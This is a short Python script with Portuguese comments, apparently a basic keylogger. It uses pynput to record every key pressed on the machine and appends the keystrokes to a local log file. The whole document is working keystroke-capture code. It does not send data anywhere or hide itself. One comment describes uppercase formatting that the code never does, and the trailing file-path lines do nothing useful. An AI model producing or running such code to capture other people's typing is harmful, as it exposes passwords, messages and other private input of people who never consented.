

import os
from pynput import keyboard

# Dicionário para mapear as teclas especiais para suas representações
teclas_especiais = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '\n',
    keyboard.Key.tab: '    ',
    keyboard.Key.backspace: "''",
    keyboard.Key.shift_l: ''
}

def on_press(key):
    try:
        # Verifica se a tecla pressionada está no dicionário de teclas especiais
        if key in teclas_especiais:
            key_str = teclas_especiais[key]
        else:
            # Convertendo a tecla pressionada em string e aplicando a formatação em letras maiúsculas
            key_str = str(key.char)
    except AttributeError:
        # Caso seja uma tecla especial que não é tratada no dicionário
        key_str = str(key)

    # Salvando a tecla pressionada em um arquivo de log
    with open('log_teclado.txt', 'a') as file:
        file.write(key_str)

# Iniciando o listener de teclado
with keyboard.Listener(on_press=on_press) as listener:
    # Mantém o programa em execução
    listener.join()

# Obtendo o diretório atual
diretorio_atual = os.getcwd()

# Exibindo o caminho completo do arquivo de log
caminho_arquivo = os.path.join(diretorio_atual, 'log_teclado.txt')
